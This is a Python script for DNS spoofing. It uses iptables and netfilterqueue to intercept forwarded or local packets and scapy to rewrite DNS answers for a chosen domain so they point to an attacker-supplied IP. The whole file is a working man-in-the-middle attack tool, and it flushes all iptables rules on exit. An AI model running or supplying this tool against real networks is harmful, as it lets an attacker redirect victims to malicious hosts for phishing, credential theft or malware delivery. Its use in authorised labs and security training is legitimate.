#!/bin/python3


# Libraries import
import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse


# Gets program arguments, target and destination domains
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target_domain', help='Specify name of target domain')
    parser.add_argument('-d', '--destination', dest='destination_domain', help='Specify IP address of the destination domain')
    parser.add_argument('-l', '--local', dest='local', action='store_true', help='Enables local packet capture (For testing purpose)')
    options = parser.parse_args()
    if not options.target_domain:
        parser.error('\n[-] Please specify name the target domain, use --help for more info.')
    elif not options.destination_domain:
        parser.error('\n[-] Please specify an IP address of the destination domain, use --help for more info.')
    return options


# Set iptables to allow local packet capture
def local_packet_capture():
    print('[+] Local packet capture enabled')
    subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
    subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)


# Set iptables to allow remote capture
def packet_capture():
    print('[+] Packet capture enabled')
    subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)


# Forges DNS response packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if target in str(qname):
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata=destination)
            scapy_packet[scapy.DNS].ancount = 1
            scapy_packet[scapy.DNS].an = answer

            # Deletes len and chksum values from the packet
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


# Sets options
options = get_arguments()
target = options.target_domain
destination = options.destination_domain
local_capture = options.local

# Packet capture proxy
try:
    if local_capture is True:
        local_packet_capture()
    else:
        packet_capture()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


# User abort
except KeyboardInterrupt:
    print('\n[+] Restoring iptables')
    subprocess.call(['iptables', '--flush'])
    print('[+] Aborting session...')
